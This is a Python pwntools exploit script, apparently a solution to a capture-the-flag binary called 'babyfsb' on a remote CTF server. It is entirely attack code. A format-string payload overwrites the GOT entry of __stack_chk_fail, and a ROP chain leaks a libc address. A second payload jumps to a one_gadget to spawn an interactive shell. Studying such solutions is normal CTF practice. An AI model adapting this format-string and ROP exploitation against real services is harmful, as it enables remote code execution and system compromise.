from pwn import *

#p = process('./babyfsb')
p = remote('ctf.j0n9hyun.xyz', 3032)
e = ELF("./babyfsb")
l = e.libc

context.log_level = "debug"

p_rdi_r = 0x0000000000400793
ppppr = 0x000000000040078c
main = 0x00000000004006A6

### overwrite __stack_chk_fail
payload = '%' + str(ppppr) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
###

### libc leak with ROP
payload += p64(p_rdi_r)
payload += p64(e.got['setvbuf'])
payload += p64(e.plt['printf'])
payload += p64(main)
###

payload += 'a' * (0x40 - len(payload)) ##triger stack smashing

p.sendafter('hello\n', payload)

libc = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - l.sym['setvbuf']
log.info('libc : ' + hex(libc))

### overwrite __stack_chk_fail
payload = '%' + str(ppppr) + 'c'
payload += '%8$n' + 'aaa'
payload += p64(e.got['__stack_chk_fail'])
###

### one_gadget
payload += p64(libc + 0x45216)
###

payload += 'a' * (0x40 - len(payload)) ##triger stack smashing

p.sendafter('hello\n', payload)

p.interactive()
